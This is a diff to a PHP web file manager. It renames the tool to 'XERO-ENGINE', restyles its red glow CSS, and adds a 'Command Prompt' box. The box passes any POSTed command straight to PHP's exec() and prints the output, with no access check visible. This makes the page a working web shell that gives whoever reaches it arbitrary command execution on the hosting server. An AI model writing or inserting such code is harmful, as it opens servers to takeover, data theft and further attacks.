@@ -388,6 +388,22 @@ if (isset($_POST['delete_scan_result']) && isset($_POST['scan_file_path'])) {
     }
 }
 
+// ============================================================
+// ================ COMMAND PROMPT =============================
+// ============================================================
+$cmdOutput = null;
+$cmdStatus = null;
+if (isset($_POST['exec_cmd'])) {
+    $cmd = trim($_POST['cmd']);
+    if ($cmd !== '') {
+        $output = [];
+        $return_var = 0;
+        exec($cmd, $output, $return_var);
+        $cmdOutput = implode("\n", $output);
+        $cmdStatus = ($return_var === 0) ? 'success' : 'error';
+    }
+}
+
 $logo_url = "https://ik.imagekit.io/ewgjpg3n7/assets/sg-removebg-preview.png";
 
 function makeBreadcrumb($p) {
@@ -409,7 +425,7 @@ function makeBreadcrumb($p) {
 <html>
 <head>
 <link rel="icon" href="https://ik.imagekit.io/ewgjpg3n7/assets/sg-removebg-preview.png">
-<title>LEUSER MANAGER</title>
+<title>XERO-ENGINE</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
 /* =========================================================
@@ -622,7 +638,15 @@ td {
     vertical-align: middle;
 }
 tr:hover td {
-    background: #181818;
+    background: #1a0a0a !important;
+    box-shadow: 0 0 25px rgba(255,0,64,0.8), inset 0 0 30px rgba(255,0,64,0.3) !important;
+    border-bottom-color: #ff0040 !important;
+    transition: all 0.15s ease;
+    text-shadow: 0 0 8px rgba(255,0,64,0.2);
+}
+.scan-result-table tr:hover td {
+    background: #1a0a0a !important;
+    box-shadow: 0 0 30px rgba(255,0,64,0.9), inset 0 0 40px rgba(255,0,64,0.4) !important;
 }
 tr:last-child td {
     border-bottom: none;
@@ -793,27 +817,6 @@ button:active, .btn:active {
 }
 
 /* =========================================================
-   GLOW HOVER SUPER TERANG UNTUK BARIS TABEL
-   ========================================================= */
-tr:hover td {
-    background: #1a0a0a !important;
-    box-shadow: 
-        0 0 25px rgba(255, 0, 64, 0.8),
-        inset 0 0 30px rgba(255, 0, 64, 0.3) !important;
-    border-bottom-color: #ff0040 !important;
-    transition: all 0.15s ease;
-    text-shadow: 0 0 8px rgba(255, 0, 64, 0.2);
-}
-
-/* Untuk baris hasil scan */
-.scan-result-table tr:hover td {
-    background: #1a0a0a !important;
-    box-shadow: 
-        0 0 30px rgba(255, 0, 64, 0.9),
-        inset 0 0 40px rgba(255, 0, 64, 0.4) !important;
-}
-
-/* =========================================================
    GLOW FOCUS UNTUK INPUT DAN TEXTAREA
    ========================================================= */
 input:focus,
@@ -821,20 +824,13 @@ textarea:focus,
 select:focus {
     outline: none !important;
     border-color: #ff0040 !important;
-    box-shadow: 
-        0 0 35px rgba(255, 0, 64, 0.7),
-        inset 0 0 20px rgba(255, 0, 64, 0.2) !important;
+    box-shadow: 0 0 35px rgba(255,0,64,0.7), inset 0 0 20px rgba(255,0,64,0.2) !important;
     background: #111 !important;
     transition: box-shadow 0.25s ease, border-color 0.25s ease;
 }
-
-/* =========================================================
-   EFEK GLOW SAAT MOUSE HOVER DI ATAS LINK / TOMBOL
-   ========================================================= */
 a:hover, button:hover {
-    text-shadow: 0 0 15px rgba(255, 0, 64, 0.7);
+    text-shadow: 0 0 15px rgba(255,0,64,0.7);
 }
-    
 </style>
 
 <script>
@@ -856,7 +852,7 @@ function showScanDetails(index) {
 <body>
 
 <div class="header-flex">
-    <h2>LEUSER MANAGER</h2>
+    <h2>XERO-ENGINE</h2>
     <img src="<?php echo $logo_url; ?>" height="55" alt="Logo">
 </div>
 
@@ -949,6 +945,21 @@ function showScanDetails(index) {
         <p style="font-size:0.7rem;color:#666;margin-top:6px;">
             Scan .php, .phtml, config, dll.
         </p>
+    </div>
+
+    <!-- ============ COMMAND PROMPT BOX ============ -->
+    <div class="action-box" style="border-color:#00ff6a;">
+        <h3 style="color:#00ff6a;">⚡ Command Prompt</h3>
+        <form method="post">
+            <input name="cmd" placeholder="ls -la" style="width:100%;" autofocus>
+            <button type="submit" name="exec_cmd" style="background:#00ff6a;color:#000;">Run</button>
+        </form>
+        <?php if ($cmdStatus !== null): ?>
+            <div class="<?php echo $cmdStatus === 'success' ? 'alert-success' : 'alert-error'; ?>" 
+                 style="margin-top:8px;white-space:pre-wrap;word-wrap:break-word;max-height:300px;overflow-y:auto;">
+                <?php echo htmlspecialchars($cmdOutput); ?>
+            </div>
+        <?php endif; ?>
     </div>
 
 </div>
